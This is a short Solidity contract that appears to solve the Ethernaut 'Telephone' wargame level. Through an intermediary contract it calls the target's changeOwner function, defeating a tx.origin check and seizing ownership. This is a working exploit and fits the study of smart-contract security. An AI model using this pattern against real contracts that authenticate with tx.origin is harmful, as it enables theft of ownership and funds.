// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Telephone.sol";

contract TelephoneSolution {
    Telephone private telephoneInstance;

    constructor(address _telephoneContractAddr) public {
        telephoneInstance = Telephone(_telephoneContractAddr);
    }

    function stealOwnership() public {
        telephoneInstance.changeOwner(msg.sender);
    }
}
